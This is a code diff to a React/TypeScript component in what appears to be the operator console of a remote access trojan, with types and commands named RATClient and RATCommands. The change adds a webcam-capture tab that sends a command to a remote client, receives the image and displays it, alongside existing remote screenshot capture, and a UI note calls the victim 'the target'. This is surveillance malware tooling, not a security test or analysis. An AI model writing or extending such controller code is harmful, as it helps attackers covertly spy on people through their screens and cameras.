@@ -1,7 +1,7 @@
 import { RATClient } from "../../../types";
 import { useState, useEffect } from "react";
 import { listen } from "@tauri-apps/api/event";
-import { takeScreenshotCmd } from "../../rat/RATCommands";
+import { takeScreenshotCmd, takeWebcamCmd } from "../../rat/RATCommands";
 import {
   IconSquareRoundedX,
   IconCamera,
@@ -16,6 +16,9 @@ import {
   IconDeviceSdCard,
   IconBrandWindows,
   IconBrandUbuntu,
+  IconCameraPlus,
+  IconVideo,
+  IconRefresh,
 } from "@tabler/icons-react";
 
 export const ClientInfo = ({
@@ -29,6 +32,8 @@ export const ClientInfo = ({
 
   const [screenshot, setScreenshot] = useState<string | null>(null);
   const [isScreenshotLoading, setIsScreenshotLoading] = useState(false);
+  const [webcamImage, setWebcamImage] = useState<string | null>(null);
+  const [isWebcamLoading, setIsWebcamLoading] = useState(false);
   const [activeSection, setActiveSection] = useState<string>("system");
 
   useEffect(() => {
@@ -44,18 +49,40 @@ export const ClientInfo = ({
 
   async function waitScreenshot() {
     listen("client_screenshot", (event) => {
-      setScreenshot(event.payload as string);
+      // Extract the data URL from the payload
+      const payload = event.payload as { addr: string; data: string };
+      setScreenshot(payload.data);
       setIsScreenshotLoading(false);
+    });
+  }
+
+  async function waitWebcamResult() {
+    listen("webcam_result", (event) => {
+      // Extract the data URL from the payload
+      const payload = event.payload as { addr: string; data: string };
+      setWebcamImage(payload.data);
+      setIsWebcamLoading(false);
     });
   }
 
   useEffect(() => {
     waitScreenshot();
+    waitWebcamResult();
   }, []);
 
   async function takeScreenshot(client: RATClient, display: number) {
     setIsScreenshotLoading(true);
     await takeScreenshotCmd(client.addr, display);
+  }
+
+  async function captureWebcam() {
+    setIsWebcamLoading(true);
+    try {
+      await takeWebcamCmd(client.addr);
+    } catch (error) {
+      console.error("Error requesting webcam:", error);
+      setIsWebcamLoading(false);
+    }
   }
 
   // Helper to determine OS icon
@@ -92,7 +119,7 @@ export const ClientInfo = ({
       {/* Tabs */}
       <div className="flex mb-4 border-b border-gray-700">
         <button
-          className={`py-2 px-4 flex items-center gap-1 ${
+          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
             activeSection === "system"
               ? "text-white border-b-2 border-accentx"
               : "text-gray-400 hover:text-white"
@@ -103,7 +130,7 @@ export const ClientInfo = ({
           <span>System</span>
         </button>
         <button
-          className={`py-2 px-4 flex items-center gap-1 ${
+          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
             activeSection === "screenshot"
               ? "text-white border-b-2 border-accentx"
               : "text-gray-400 hover:text-white"
@@ -112,6 +139,17 @@ export const ClientInfo = ({
         >
           <IconCamera size={16} />
           <span>Screenshot</span>
+        </button>
+        <button
+          className={`py-2 px-4 flex items-center gap-1 cursor-pointer ${
+            activeSection === "webcam"
+              ? "text-white border-b-2 border-accentx"
+              : "text-gray-400 hover:text-white"
+          }`}
+          onClick={() => setActiveSection("webcam")}
+        >
+          <IconVideo size={16} />
+          <span>Webcam</span>
         </button>
       </div>
 
@@ -253,7 +291,7 @@ export const ClientInfo = ({
             >
               {screenshot ? (
                 <img
-                  src={`data:image/png;base64,${screenshot}`}
+                  src={screenshot}
                   alt="Screenshot"
                   className="max-w-full max-h-full rounded-lg"
                 />
@@ -280,7 +318,7 @@ export const ClientInfo = ({
                       key={index}
                       onClick={() => takeScreenshot(client, index)}
                       disabled={isScreenshotLoading}
-                      className={`flex items-center gap-1 rounded-full px-3 py-1.5 border 
+                      className={`flex items-center gap-1 rounded-full px-3 py-1.5 border cursor-pointer 
                         ${
                           isScreenshotLoading
                             ? "border-gray-600 text-gray-400 cursor-not-allowed"
@@ -292,6 +330,75 @@ export const ClientInfo = ({
                     </button>
                   ))}
               </div>
+            </div>
+          </div>
+        )}
+
+        {activeSection === "webcam" && (
+          <div className="space-y-4">
+            {/* Webcam display */}
+            <div
+              className={`w-full aspect-[4/3] border border-accentx rounded-xl flex items-center justify-center bg-primarybg overflow-hidden ${
+                isWebcamLoading ? "animate-pulse" : ""
+              }`}
+            >
+              {webcamImage ? (
+                <img
+                  src={webcamImage}
+                  alt="Webcam capture"
+                  className="max-w-full max-h-full rounded-lg"
+                />
+              ) : (
+                <div className="flex flex-col items-center justify-center text-gray-400">
+                  <IconVideo size={48} />
+                  <p className="text-sm mt-2">No webcam image available</p>
+                  {isWebcamLoading && (
+                    <p className="text-xs mt-1 text-accentx">
+                      Accessing webcam...
+                    </p>
+                  )}
+                </div>
+              )}
+            </div>
+
+            {/* Webcam controls */}
+            <div className="bg-primarybg rounded-lg p-3">
+              <div className="flex justify-between items-center">
+                <h3 className="text-accentx font-semibold text-sm flex items-center gap-1">
+                  <IconVideo size={16} />
+                  <span>WEBCAM CAPTURE</span>
+                </h3>
+                <div className="flex gap-2">
+                  <button
+                    onClick={captureWebcam}
+                    disabled={isWebcamLoading}
+                    className={`cursor-pointer flex items-center gap-1 rounded-full px-3 py-1.5 border
+                      ${
+                        isWebcamLoading
+                          ? "border-gray-600 text-gray-400 cursor-not-allowed"
+                          : "border-accentx text-white hover:bg-accentx/30 transition"
+                      }`}
+                  >
+                    {webcamImage ? (
+                      <>
+                        <IconRefresh size={16} />
+                        <span>Refresh</span>
+                      </>
+                    ) : (
+                      <>
+                        <IconCameraPlus size={16} />
+                        <span>Capture</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+              </div>
+              {isWebcamLoading && (
+                <p className="text-xs mt-2 text-gray-400">
+                  This may take a few seconds. The target will see a webcam
+                  permission prompt.
+                </p>
+              )}
             </div>
           </div>
         )}
